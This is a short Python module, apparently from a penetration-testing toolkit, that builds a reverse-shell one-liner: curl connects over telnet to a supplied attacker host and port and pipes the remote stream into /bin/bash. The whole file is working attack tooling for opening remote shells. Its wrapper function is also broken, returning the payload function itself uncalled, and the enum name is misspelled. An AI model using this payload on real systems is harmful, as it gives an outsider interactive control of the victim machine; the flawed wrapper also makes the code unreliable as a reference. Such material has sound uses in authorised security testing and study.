import logging

from enum import Enum
from typing import Optional

logger = logging.getLogger(__name__)

class CurlPayloadType(Enum):
    CURL_TELENT = 0

def generate_reverse_shell(
    lhost: str,
    lport: int,
    curl_path: str = "/bin/curl",
    shell_path: str = "/bin/bash",
    payload_type: CurlPayloadType = CurlPayloadType.CURL_TELENT,
) -> Optional[str]:
    payload: Optional[str] = None

    match payload_type:
        case CurlPayloadType.CURL_TELENT:
            payload = generate_curl_telnet_payload
        case _:
            logger.error("unknown curl payload type")
            pass
            
    return payload

def generate_curl_telnet_payload(
    lhost: str,
    lport: int,
    curl_path: str = "/bin/curl",
    shell_path: str = "/bin/bash",
) -> str:
    return f"C='{curl_path} -Ns telnet://{lhost}:{lport}'; $C </dev/null 2>&1 | {shell_path} 2>&1 | $C >/dev/null"
